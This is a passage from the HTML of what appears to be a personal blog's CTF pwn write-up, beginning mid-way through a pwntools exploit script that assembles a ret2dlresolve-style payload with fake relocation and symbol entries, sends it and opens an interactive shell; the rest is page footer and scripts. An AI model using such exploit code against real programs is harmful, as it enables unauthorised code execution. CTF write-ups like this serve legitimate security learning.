p32(<span class="hljs-built_in">len</span>(cmd))<br>, fake_write_rel <span class="hljs-comment"># base_stage + 28</span><br>, <span class="hljs-string">b&#x27;A&#x27;</span> * align <span class="hljs-comment"># 用于对齐的填充</span><br>, fake_sym <span class="hljs-comment"># base_stage + 36 + align</span><br>, fake_write_str <span class="hljs-comment"># 伪造出的字符串</span><br>)<br>payload2 += flat(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">80</span>-<span class="hljs-built_in">len</span>(payload2)) , cmd + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>payload2 += flat(<span class="hljs-string">&#x27;A&#x27;</span> * (<span class="hljs-number">100</span>-<span class="hljs-built_in">len</span>(payload2)))<br><span class="hljs-comment">#pause()</span><br>p.send(payload2)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/12/02/ISCTF-pwn/">ISCTF_pwn Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://str1ke4fun.github.io/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>